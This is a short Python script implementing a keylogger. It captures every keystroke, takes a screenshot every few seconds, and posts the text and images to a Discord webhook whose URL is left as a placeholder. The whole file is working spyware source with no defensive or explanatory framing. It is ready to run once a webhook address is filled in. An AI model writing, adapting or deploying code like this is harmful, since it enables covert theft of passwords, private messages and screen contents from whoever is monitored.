import os
from pynput.keyboard import Key, Listener
import requests
import threading
import pyautogui

class KeyLogger:
    def __init__(self, webhook_url, time_interval=7, images_folder="images"):
        self.text = []
        self.webhook_url = webhook_url
        self.time_interval = time_interval
        self.images_folder = images_folder
        os.makedirs(self.images_folder, exist_ok=True)

    def get_unique_filename(self):
        for i in range(1, 1000000):
            filename = os.path.join(self.images_folder, f"image{i}.png")
            if not os.path.exists(filename):
                return filename

    def take_screenshot(self):
        screenshot = pyautogui.screenshot()
        filename = self.get_unique_filename()
        screenshot.save(filename)
        return filename

    def send_data(self):
        screenshot_path = self.take_screenshot()

        data = {
            "content": f"""```
{''.join(self.text)}
```""",
            "title": "key_logger"
        }

        with open(screenshot_path, "rb") as image_file:
            files = {"file": image_file}
            try:
                requests.post(self.webhook_url, data=data, files=files)
            except Exception as e:
                print(f"Failed to send data: {e}")

        self.text.clear()
        threading.Timer(self.time_interval, self.send_data).start()

    def on_press(self, key):
        try:
            if key == Key.space:
                self.text.append(" ")
            elif key == Key.enter:
                self.text.append("\n")
            elif key == Key.tab:
                self.text.append("\t")
            elif key == Key.backspace:
                if self.text:
                    self.text.pop()
            elif key == Key.esc:
                return False
            else:
                self.text.append(key.char)
        except AttributeError:
            self.text.append(f" [{key}] ")

    def run(self):
        self.send_data()
        with Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    webhook_url = "discord_webhook_url"
    keylogger = KeyLogger(webhook_url)
    keylogger.run()
